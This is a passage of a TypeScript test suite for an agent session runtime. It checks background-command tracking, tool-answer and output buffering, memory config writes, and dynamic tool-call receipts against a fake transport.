    const level = events.find((e) => e.type === 'background_work')
    expect(level).toMatchObject({
      running: [
        {
          id: '42852',
          toolCallId: 'exec-62bc2acf-84b1-41a0-8d14-505c4014166e',
          description: 'sleep 402.278',
        },
      ],
      source: 'thread/backgroundTerminals/list',
    })
    await handle.close()
    await consumer
  })

  it('🔴 a STALE turn/completed asks for NO level — it is not a turn boundary (287 finding 2)', async () => {
    const listCalls = (t: FakeTransport): number =>
      t.requests.filter((r) => r.method === 'thread/backgroundTerminals/list').length
    const { transport, handle, events, consumer } = await startCodexInTurn()

    transport.onRequest('thread/backgroundTerminals/list', () => ({ data: [], nextCursor: null }))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(listCalls(transport)).toBe(1))

    await handle.send('two')
    await vi.waitFor(() => expect(handle.status()).toBe('working'))
    transport.onRequest('thread/backgroundTerminals/list', () => ({
      data: [ROW],
      nextCursor: null,
    }))

    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await new Promise((resolve) => setTimeout(resolve, 40))

    expect(listCalls(transport), 'a rejected completion buys no request').toBe(1)
    expect(
      events.filter((e) => e.type === 'background_work' && (e.running?.length ?? 0) > 0),
      'and turn 2’s foreground command never entered the registry',
    ).toEqual([])
    expect(handle.status(), 'turn 2 is still running, as 036 P1-C already required').toBe('working')
    await handle.close()
    await consumer
  })

  it('⛔ states the level on a RESUME, so a replayed ledger stops showing dead rows', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    transport.onRequest('thread/backgroundTerminals/list', () => ({ data: [], nextCursor: null }))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home' },
    )
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await vi.waitFor(() =>
      expect(events.some((e) => e.type === 'background_work' && e.running?.length === 0)).toBe(
        true,
      ),
    )
    await handle.close()
    await consumer
  })

  it('…and asks nothing on a fresh START, where there is no ledger to have replayed one', async () => {
    const { transport, handle, consumer } = await startCodex()
    await new Promise((resolve) => setTimeout(resolve, 60))
    expect(
      transport.requests.filter((r) => r.method === 'thread/backgroundTerminals/list'),
      'a guaranteed-empty answer on every session this app opens is the request 275 §1 warns about',
    ).toEqual([])
    await handle.close()
    await consumer
  })

  it('⛔ stops asking once the session closes — 273’s door, on the channel 275 opened', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.onRequest('thread/backgroundTerminals/list', () => ({
      data: [ROW],
      nextCursor: null,
    }))
    await handle.close()
    await consumer
    const after = transport.requests.filter(
      (r) => r.method === 'thread/backgroundTerminals/list',
    ).length
    await new Promise((resolve) => setTimeout(resolve, 60))
    expect(
      transport.requests.filter((r) => r.method === 'thread/backgroundTerminals/list').length,
      'the watch must not out-live the session it belongs to',
    ).toBe(after)
  })
})

describe('CodexSessionHandle — the whole of what a tool answered (462)', () => {
  const ITEM = 'exec-462-b24c-f0b42a7ad785'
  const completed = (
    turnId: string,
    over: Record<string, unknown> = {},
  ): Record<string, unknown> => ({
    threadId: 'th_1',
    turnId,
    item: {
      type: 'dynamicToolCall',
      id: ITEM,
      namespace: 'brobot',
      tool: 'list_projects',
      arguments: {},
      status: 'completed',
      success: true,
      durationMs: 4,
      contentItems: [
        { type: 'inputText', text: 'Six projects, and you may send work into all of them.' },
        { type: 'inputText', text: '{"outcome":"ok","count":6}' },
      ],
      ...over,
    },
  })

  it('⚑ both halves are held, keyed by the id the ROW carries', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/completed', completed(turnId))
    await vi.waitFor(() => expect(handle.toolAnswer?.(ITEM)?.parts).toHaveLength(2))
    expect(handle.toolAnswer?.(ITEM)?.parts.map((p) => p.text)).toEqual([
      'Six projects, and you may send work into all of them.',
      '{"outcome":"ok","count":6}',
    ])

    const row = events.find((e) => e.type === 'tool_result')
    expect(row?.type === 'tool_result' && row.id, 'the hold is keyed by the row’s own id').toBe(
      ITEM,
    )
    expect(row?.type === 'tool_result' && row.summary).toBe(
      'Six projects, and you may send work into all of them.',
    )

    expect(handle.toolAnswer?.('exec-nobody'), 'an id we hold nothing for').toBeNull()
    await handle.close()
    await consumer
  })

  it('⛔ a foreign thread’s completion writes nothing — the gate above it is still the gate', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/completed', { ...completed(turnId), threadId: 'th_someone_else' })
    transport.notification('item/completed', completed(turnId))
    await vi.waitFor(() => expect(handle.toolAnswer?.(ITEM)).not.toBeNull())
    expect(handle.toolAnswer?.(ITEM)?.parts).toHaveLength(2)
    await handle.close()
    await consumer
  })

  it('⚠️ a COMMAND’s completion holds nothing here — its output has a surface of its own', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId,
      item: { type: 'commandExecution', id: 'exec-cmd', command: 'ls', aggregatedOutput: 'a\nb\n' },
    })
    transport.notification('item/completed', completed(turnId))
    await vi.waitFor(() => expect(handle.toolAnswer?.(ITEM)).not.toBeNull())
    expect(
      handle.toolAnswer?.('exec-cmd'),
      'a command’s output was held as a tool answer',
    ).toBeNull()
    await handle.close()
    await consumer
  })
})

describe('CodexSessionHandle — a running command’s output (300)', () => {
  const ITEM = 'exec-14dfe485-2de2-4f00-b24c-f0b42a7ad785'
  const started = (turnId: string): Record<string, unknown> => ({
    threadId: 'th_1',
    turnId,
    item: { type: 'commandExecution', id: ITEM, command: 'seq 1 12', processId: '28992' },
  })
  const delta = (turnId: string, text: string): Record<string, unknown> => ({
    threadId: 'th_1',
    turnId,
    itemId: ITEM,
    delta: text,
  })

  it('⚑ keeps what the command prints, keyed by the id the CARD carries', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'tick-1\n'))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'tick-2\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.text).toBe('tick-1\ntick-2\n'))

    const call = events.find((e) => e.type === 'tool_call')
    expect(call, 'a card must exist for the tail to belong to').toBeDefined()
    expect(call?.type === 'tool_call' && call.id, 'the delta names the card’s own id').toBe(ITEM)

    expect(handle.commandOutput?.('exec-nobody'), 'an id we hold nothing for').toBeNull()
    await handle.close()
    await consumer
  })

  it('🔴 …and KEEPS keeping it after the turn ends — which is when it becomes background work', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'bgtick-1\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.text).toBe('bgtick-1\n'))

    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(turnId)),
    )
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'turn')).toHaveLength(1))
    const eventsAtTurnEnd = events.length

    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'bgtick-2\n'))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'bgtick-3\n'))
    await vi.waitFor(() =>
      expect(handle.commandOutput?.(ITEM)?.text).toBe('bgtick-1\nbgtick-2\nbgtick-3\n'),
    )

    expect(events.length, 'a post-turn delta must reach the tail and nothing else').toBe(
      eventsAtTurnEnd,
    )
    await handle.close()
    await consumer
  })

  it('⛔ a delta for ANOTHER thread reaches neither the tail nor the transcript', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'ours\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.text).toBe('ours\n'))
    const before = events.length

    transport.notification('item/commandExecution/outputDelta', {
      threadId: 'th_someone_else',
      turnId,
      itemId: ITEM,
      delta: 'FOREIGN\n',
    })
    await new Promise((resolve) => setTimeout(resolve, 25))
    expect(handle.commandOutput?.(ITEM)?.text, 'a foreign thread wrote into our tail').toBe(
      'ours\n',
    )
    expect(events.length).toBe(before)
    await handle.close()
    await consumer
  })

  it('⚑ says the tail is CLOSED once the provider reports the item finished', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'done\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.closed).toBe(false))
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId,
      item: { type: 'commandExecution', id: ITEM, command: 'seq 1 12', status: 'completed' },
    })
    await vi.waitFor(() =>
      expect(handle.commandOutput?.(ITEM)).toEqual({
        text: 'done\n',
        dropped: 0,
        closed: true,
      }),
    )
    await handle.close()
    await consumer
  })

  it('🔴 …and the registry’s ENDING closes it too, which is a detached command’s only closer', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'detached\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.closed).toBe(false))

    transport.onRequest('thread/backgroundTerminals/list', () => ({
      data: [{ itemId: ITEM, processId: '28992', command: 'seq 1 12', cwd: '/tmp/x' }],
      nextCursor: null,
    }))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(turnId)),
    )
    await vi.waitFor(() =>
      expect(transport.requests.some((r) => r.method === 'thread/backgroundTerminals/list')).toBe(
        true,
      ),
    )
    transport.onRequest('thread/backgroundTerminals/list', () => ({ data: [], nextCursor: null }))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.closed).toBe(true), {
      timeout: 4_000,
    })
    expect(handle.commandOutput?.(ITEM)?.text, 'and what it printed is still there').toBe(
      'detached\n',
    )
    await handle.close()
    await consumer
  })

  it('⛔ lets the buffers go when the session does', async () => {
    const { transport, handle, consumer } = await startCodexInTurn()
    const turnId = transport.lastTurnId
    transport.notification('item/started', started(turnId))
    transport.notification('item/commandExecution/outputDelta', delta(turnId, 'held\n'))
    await vi.waitFor(() => expect(handle.commandOutput?.(ITEM)?.text).toBe('held\n'))
    await handle.close()
    await consumer
    expect(handle.commandOutput?.(ITEM)).toBeNull()
  })
})

describe('Codex memory is switched on at launch (314 §2)', () => {
  let home: string

  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), 'brobot2-314-launch-'))
  })

  afterEach(() => {
    rmSync(home, { recursive: true, force: true })
  })

  const config = (): string => join(home, 'config.toml')

  it('⛔ a START on a home with no config writes both gates — before the spawn', async () => {
    let atSpawn: string | null = null
    const transport = new FakeTransport()
    transport.codexHome = home
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(() => {
      atSpawn = existsSync(config()) ? readFileSync(config(), 'utf8') : null
      return transport
    }).start({ cwd: '/tmp/x', providerHome: home })
    expect(atSpawn, 'the gates must be on disk when the transport is built').toContain(
      'memories = true',
    )
    expect(atSpawn).toContain('dedicated_tools = true')
    expect(atSpawn).toContain('use_memories = true')
    expect(atSpawn).toContain('generate_memories = true')
    await handle.close()
  })

  it('⛔ …and so does a RESUME — the path an existing profile actually arrives by', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: home },
    )
    expect(readFileSync(config(), 'utf8')).toContain('dedicated_tools = true')
    await handle.close()
  })

  it('⚠️ a config that cannot be merged still LAUNCHES, and is left exactly as it was', async () => {
    const theirs = 'features = 3\n'
    writeFileSync(config(), theirs)
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: home,
    })
    expect(handle.ref?.sessionId).toBe('th_1')
    expect(readFileSync(config(), 'utf8')).toBe(theirs)
    await handle.close()
  })

  it('⛔ the gates are written BELOW the stale sweep and ABOVE the attestation', async () => {
    writeFileSync(config(), 'sqlite_home = "sub/state"\n')
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: home,
    })
    const after = readFileSync(config(), 'utf8')
    expect(after).toContain('sqlite_home = "sub/state"')
    expect(after).toContain('memories = true')
    await handle.close()
  })

  it('🔴 …and a config that REDIRECTS sqlite state still fails the launch closed', async () => {
    writeFileSync(config(), 'sqlite_home = "/tmp/brobot-escape"\n')
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    await expect(
      new CodexRuntime(adopt(transport)).start({ cwd: '/tmp/x', providerHome: home }),
    ).rejects.toThrow(/redirects/)
    expect(readFileSync(config(), 'utf8')).toContain('sqlite_home = "/tmp/brobot-escape"')
  })
})

describe('348 · dynamic tools, on the wire', () => {
  function tools(): { set: AgentToolset; calls: Record<string, unknown>[] } {
    const calls: Record<string, unknown>[] = []
    return {
      calls,
      set: {
        server: 'brobot',
        instructions: 'reach the app',
        tools: [
          {
            name: 'spawn_agent',
            description: 'Create another agent.',
            beyondItsRails: 'it-starts-something-outside-this-app',
            input: { profile_slug: z.string() },
            call: async (args) => {
              calls.push(args)
              return { text: 'spawned sess_9', structured: { outcome: 'ok' } }
            },
          },
          {
            name: 'reply_to_parent',
            description: 'Answer the conversation that gave you the work.',
            beyondItsRails: 'nothing-its-rails-do-not-cover',
            input: { task_id: z.string() },
            call: async (args) => {
              calls.push(args)
              return { text: 'replied', structured: { outcome: 'ok' } }
            },
          },
        ],
      },
    }
  }

  const started = (transport: FakeTransport) =>
    transport.requests.find((one) => one.method === 'thread/start')?.params as
      Record<string, unknown> | undefined

  async function inTurn(
    agentTools: AgentToolset | undefined,
    approvalMode?: 'ask' | 'auto',
  ): Promise<{
    transport: FakeTransport
    handle: SessionHandle
    events: RuntimeEvent[]
  }> {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () =>
      approvalMode === 'auto'
        ? {
            ...okThread('th_1'),
            approvalPolicy: 'never',
            approvalsReviewer: 'user',
            sandbox: { type: 'dangerFullAccess' },
          }
        : okThread('th_1'),
    )
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      ...(agentTools ? { agentTools } : {}),
      ...(approvalMode ? { approvalMode } : {}),
    })
    const events: RuntimeEvent[] = []
    void collect(handle, events)
    await handle.send('go')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    return { transport, handle, events }
  }

  const firstAct = 'message_act_00000000-0000-4000-8000-000000000001'
  const secondAct = 'message_act_00000000-0000-4000-8000-000000000002'
  const messageAnswer = (messageAct: string) => ({
    text: 'Done.',
    structured: { outcome: 'ok', kind: 'note', delivery: 'sent', agent: 'receiver', messageAct },
  })
  function messageTools(
    call: (args: Record<string, unknown>) => Promise<import('../src/agent-tools').AgentToolAnswer>,
  ): AgentToolset {
    return {
      server: 'brobot',
      tools: [
        {
          name: 'message_agent',
          description: 'Deliver a note.',
          beyondItsRails: 'nothing-its-rails-do-not-cover',
          input: { act: z.string() },
          call,
        },
      ],
    }
  }
  function finishedMessage(
    transport: FakeTransport,
    id: string,
    changes: Record<string, unknown> = {},
  ): void {
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: transport.lastTurnId,
      item: {
        id,
        type: 'dynamicToolCall',
        namespace: 'brobot',
        tool: 'message_agent',
        status: 'completed',
        success: true,
        contentItems: [{ type: 'inputText', text: 'Done.' }],
        ...changes,
      },
    })
  }

  it.each(['auto', 'rails', 'card'] as const)(
    'the %s dispatch exit keeps a receipt inside the app',
    async (path) => {
      const original = messageTools(async () => messageAnswer(firstAct))
      const set: AgentToolset =
        path === 'card'
          ? {
              ...original,
              tools: original.tools.map((one) => ({
                ...one,
                beyondItsRails: 'it-destroys-work-in-flight',
              })),
            }
          : original
      const { transport, handle, events } = await inTurn(set, path === 'auto' ? 'auto' : 'ask')
      try {
        transport.serverRequest(1, 'item/tool/call', {
          callId: 'a',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: firstAct },
        })
        if (path === 'card') {
          const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
          expect(transport.responses).toHaveLength(0)
          await handle.respondPermission(card.id, { outcome: 'allow' })
        }
        await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
        expect(transport.responses[0]!.result).toEqual({
          contentItems: [{ type: 'inputText', text: 'Done.' }],
          success: true,
        })
        finishedMessage(transport, 'a')
        await vi.waitFor(() =>
          expect(events.some((event) => event.type === 'tool_result')).toBe(true),
        )
        expect(events.find((event) => event.type === 'tool_result')).toMatchObject({
          id: 'a',
          messageAct: firstAct,
        })
      } finally {
        await handle.close()
      }
    },
  )

  it.each(['refused', 'thrown', 'failed-result'] as const)(
    'a %s message cannot publish an act from a claimed call',
    async (path) => {
      const set = messageTools(async () => {
        if (path === 'thrown') throw new Error('fictional handler failure')
        if (path === 'refused')
          return {
            text: 'refused (no-such-agent): Nothing was sent.',
            structured: { ...messageAnswer(firstAct).structured, outcome: 'refused' },
          }
        return messageAnswer(firstAct)
      })
      const { transport, handle, events } = await inTurn(set, 'auto')
      try {
        transport.serverRequest(1, 'item/tool/call', {
          callId: 'a',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: firstAct },
        })
        await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
        finishedMessage(
          transport,
          'a',
          path === 'failed-result' ? { success: false, status: 'failed' } : {},
        )
        await vi.waitFor(() =>
          expect(events.some((event) => event.type === 'tool_result')).toBe(true),
        )
        expect(events.find((event) => event.type === 'tool_result')).not.toHaveProperty(
          'messageAct',
        )
        finishedMessage(transport, 'a')
        await vi.waitFor(() =>
          expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(2),
        )
        expect(events.filter((event) => event.type === 'tool_result')[1]).not.toHaveProperty(
          'messageAct',
        )
      } finally {
        await handle.close()
      }
    },
  )

  it('pairs actual accepted callIds when two messages complete out of order, independently of RPC ids', async () => {
    const { transport, handle, events } = await inTurn(
      messageTools(async (args) => messageAnswer(String(args.act))),
      'auto',
    )
    try {
      transport.serverRequest(700, 'item/tool/call', {
        callId: 'a',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { act: firstAct },
      })
      transport.serverRequest(701, 'item/tool/call', {
        callId: 'b',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { act: secondAct },
      })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(2))
      for (const response of transport.responses)
        expect(response.result).toMatchObject({
          contentItems: [{ type: 'inputText', text: 'Done.' }],
          success: true,
        })
      finishedMessage(transport, 'b')
      finishedMessage(transport, 'a')
      await vi.waitFor(() =>
        expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(2),
      )
      expect(events.filter((event) => event.type === 'tool_result')).toMatchObject([
        { id: 'b', messageAct: secondAct },
        { id: 'a', messageAct: firstAct },
      ])
      finishedMessage(transport, 'a')
      finishedMessage(transport, '700')
      await vi.waitFor(() =>
        expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(4),
      )
      expect(
        events
          .filter((event) => event.type === 'tool_result')
          .slice(2)
          .every((event) => !('messageAct' in event)),
      ).toBe(true)
    } finally {
      await handle.close()
    }
  })

  it('a foreign or stale completion does not spend the matching current message receipt', async () => {
    const { transport, handle, events } = await inTurn(
      messageTools(async () => messageAnswer(firstAct)),
      'auto',
    )
    try {
      transport.serverRequest(1, 'item/tool/call', {
        callId: 'a',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { act: firstAct },
      })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
      finishedMessage(transport, 'a', { namespace: 'foreign' })
      transport.notification('item/completed', {
        threadId: 'th_1',
        turnId: 'old',
        item: {
          id: 'a',
          type: 'dynamicToolCall',
          namespace: 'brobot',
          tool: 'message_agent',
          status: 'completed',
          success: true,
        },
      })
      finishedMessage(transport, 'a')
      await vi.waitFor(() =>
        expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(2),
      )
      expect(events.filter((event) => event.type === 'tool_result')).toMatchObject([
        { id: 'a' },
        { id: 'a', messageAct: firstAct },
      ])
      expect(events.filter((event) => event.type === 'tool_result')[0]).not.toHaveProperty(
        'messageAct',
      )
    } finally {
      await handle.close()
    }
  })

  it('duplicate accepted provider callIds fail closed even when their RPC ids differ', async () => {
    const { transport, handle, events } = await inTurn(
      messageTools(async () => messageAnswer(firstAct)),
      'auto',
    )
    try {
      for (const rpc of [1, 2])
        transport.serverRequest(rpc, 'item/tool/call', {
          callId: 'a',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: firstAct },
        })
      await vi.waitFor(() => expect(transport.responses).toHaveLength(2))
      finishedMessage(transport, 'a')
      await vi.waitFor(() =>
        expect(events.some((event) => event.type === 'tool_result')).toBe(true),
      )
      expect(events.find((event) => event.type === 'tool_result')).not.toHaveProperty('messageAct')
    } finally {
      await handle.close()
    }
  })

  it.each(['auto', 'rails', 'card'] as const)(
    'a provider resolves a deferred %s message before its response, so its late answer has no receipt',
    async (path) => {
      let finish: ((answer: import('../src/agent-tools').AgentToolAnswer) => void) | undefined
      const original = messageTools(async (args) =>
        args.act === firstAct
          ? new Promise((resolve) => {
              finish = resolve
            })
          : messageAnswer(secondAct),
      )
      const set: AgentToolset =
        path === 'card'
          ? {
              ...original,
              tools: original.tools.map((one) => ({
                ...one,
                beyondItsRails: 'it-destroys-work-in-flight',
              })),
            }
          : original
      const { transport, handle, events } = await inTurn(set, path === 'auto' ? 'auto' : 'ask')
      try {
        transport.serverRequest(700, 'item/tool/call', {
          callId: 'a',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: firstAct },
        })
        if (path === 'card') {
          const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
          await handle.respondPermission(card.id, { outcome: 'allow' })
        }
        await vi.waitFor(() => expect(finish).toBeDefined())
        expect(transport.responses).toHaveLength(0)
        transport.notification('serverRequest/resolved', { threadId: 'th_1', requestId: 700 })
        transport.serverRequest(701, 'item/tool/call', {
          callId: 'b',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: secondAct },
        })
        if (path === 'card') {
          const next = await vi.waitFor(() => {
            const cards = events.filter((event) => event.type === 'permission_request')
            expect(cards).toHaveLength(2)
            return cards[1]!
          })
          await handle.respondPermission(next.id, { outcome: 'allow' })
        }
        await vi.waitFor(() => expect(transport.responses.map((one) => one.id)).toEqual([701]))
        finish!(messageAnswer(firstAct))
        finishedMessage(transport, 'a')
        finishedMessage(transport, 'b')
        await vi.waitFor(() =>
          expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(2),
        )
        const results = events.filter((event) => event.type === 'tool_result')
        expect(results[0]).toMatchObject({ id: 'a' })
        expect(results[0]).not.toHaveProperty('messageAct')
        expect(results[1]).toMatchObject({ id: 'b', messageAct: secondAct })
        expect(transport.responses.map((one) => one.id)).toEqual([701])
      } finally {
        finish?.(messageAnswer(firstAct))
        await handle.close()
      }
    },
  )

  it.each(['auto', 'rails', 'card'] as const)(
    'a response sent before provider resolution keeps its %s message receipt',
    async (path) => {
      const original = messageTools(async () => messageAnswer(firstAct))
      const set: AgentToolset =
        path === 'card'
          ? {
              ...original,
              tools: original.tools.map((one) => ({
                ...one,
                beyondItsRails: 'it-destroys-work-in-flight',
              })),
            }
          : original
      const { transport, handle, events } = await inTurn(set, path === 'auto' ? 'auto' : 'ask')
      try {
        transport.serverRequest(700, 'item/tool/call', {
          callId: 'a',
          namespace: 'brobot',
          tool: 'message_agent',
          arguments: { act: firstAct },
        })
        if (path === 'card') {
          const card = await vi.waitFor(() => firstOfType(events, 'permission_request'))
          await handle.respondPermission(card.id, { outcome: 'allow' })
        }
        await vi.waitFor(() => expect(transport.responses.map((one) => one.id)).toEqual([700]))
        transport.notification('serverRequest/resolved', { threadId: 'th_1', requestId: 700 })
        finishedMessage(transport, 'a')
        await vi.waitFor(() =>
          expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(1),
        )
        expect(events.find((event) => event.type === 'tool_result')).toMatchObject({
          id: 'a',
          messageAct: firstAct,
        })
        finishedMessage(transport, 'a')
        await vi.waitFor(() =>
          expect(events.filter((event) => event.type === 'tool_result')).toHaveLength(2),
        )
        expect(events.filter((event) => event.type === 'tool_result')[1]).not.toHaveProperty(
          'messageAct',
        )
        expect(transport.responses.map((one) => one.id)).toEqual([700])
      } finally {
        await handle.close()
      }
    },
  )

  it('a host callback finishing after turn retirement cannot attach its act to the next turn', async () => {
    let finish: ((answer: import('../src/agent-tools').AgentToolAnswer) => void) | undefined
    const { transport, handle, events } = await inTurn(
      messageTools(
        () =>
          new Promise((resolve) => {
            finish = resolve
          }),
      ),
      'auto',
    )
    try {
      transport.serverRequest(1, 'item/tool/call', {
        callId: 'a',
        namespace: 'brobot',
        tool: 'message_agent',
        arguments: { act: firstAct },
      })
      await vi.waitFor(() => expect(finish).toBeDefined())
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
      )
      await vi.waitFor(() =>
        expect(events.some((event) => event.type === 'turn' && event.state === 'completed')).toBe(
          true,
        ),
      )
      finish!(messageAnswer(firstAct))
      await handle.send('next')
      finishedMessage(transport, 'a')
      await vi.waitFor(() =>
        expect(events.some((event) => event.type === 'tool_result')).toBe(true),
      )
      expect(events.find((event) => event.type === 'tool_result')).not.toHaveProperty('messageAct')
    } finally {
      await handle.close()
    }
  })

  it('⛔ thread/start carries the namespace, and a session with no toolset carries no field', async () => {
    const withTools = await inTurn(tools().set)
    const spec = (started(withTools.transport)?.['dynamicTools'] as { name?: string }[])?.[0]
    expect(spec?.name).toBe('brobot')
    await withTools.handle.close()

    const without = await inTurn(undefined)
    expect(started(without.transport)).not.toHaveProperty('dynamicTools')
    await without.handle.close()
  })

  it('⛔ publishes what was DECLARED and says the provider reports nothing', async () => {
    const { transport, handle, events } = await inTurn(tools().set)
    await vi.waitFor(() => expect(events.some((e) => e.type === 'tool_inventory')).toBe(true))
    const event = events.find((e) => e.type === 'tool_inventory')
    expect(event?.published, 'this provider publishes no inventory, ever').toBeNull()
    expect(event?.declared?.server).toBe('brobot')
    expect(event?.declared?.tools.map((tool) => tool.name)).toEqual([
      'spawn_agent',
      'reply_to_parent',
    ])
    expect(event?.declared?.tools[0]?.parameters).toEqual([
      { name: 'profile_slug', type: 'string', required: true },
    ])
    expect(event?.naming).toEqual({ prefix: '', separator: '__' })
    expect(event?.source).toBe('thread/start')
    expect((started(transport)?.['dynamicTools'] as { name?: string }[])?.[0]?.name).toBe('brobot')
    await handle.close()
  })

  it('⛔ …and a session with NO toolset publishes `declared: null`, not an empty one', async () => {
    const { handle, events } = await inTurn(undefined)
    await vi.waitFor(() => expect(events.some((e) => e.type === 'tool_inventory')).toBe(true))
    const event = events.find((e) => e.type === 'tool_inventory')
    expect(event?.declared).toBeNull()
    expect(event?.published).toBeNull()
    await handle.close()
  })

  it('🔴 a RESUMED thread still states its inventory, and says which moment it is', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', agentTools: tools().set },
    )
    const events: RuntimeEvent[] = []
    void collect(handle, events)
    await vi.waitFor(() => expect(events.some((e) => e.type === 'tool_inventory')).toBe(true))
    const event = events.find((e) => e.type === 'tool_inventory')
    expect(event?.declared?.tools.map((tool) => tool.name)).toEqual([
      'spawn_agent',
      'reply_to_parent',
    ])
    expect(event?.published).toBeNull()
    expect(event?.source).toBe('thread/resume')
    await handle.close()
  })

  it('🔴 thread/resume carries no tools, because the app-server remembers them', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', agentTools: tools().set },
    )
    const resumed = transport.requests.find((one) => one.method === 'thread/resume')?.params
    expect(resumed).not.toHaveProperty('dynamicTools')
    expect(resumed).toHaveProperty('cwd', '/tmp/x')
    await handle.close()
  })

  it('🔴 a RESUMED session answers a tool call — the toolset is carried, not re-declared', async () => {
    const { set, calls } = tools()
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: { type: 'dangerFullAccess' },
    }))
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      {
        providerHome: '/tmp/x/home',
        agentTools: set,
        approvalMode: 'auto',
      },
    )
    const events: RuntimeEvent[] = []
    void collect(handle, events)
    await handle.send('go')
    await vi.waitFor(() =>
      expect(events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
    )
    transport.serverRequest(7, 'item/tool/call', {
      callId: 'c1',
      namespace: 'brobot',
      tool: 'spawn_agent',
      arguments: { profile_slug: 'worker' },
    })
    await vi.waitFor(() => expect(transport.responses).toHaveLength(1))
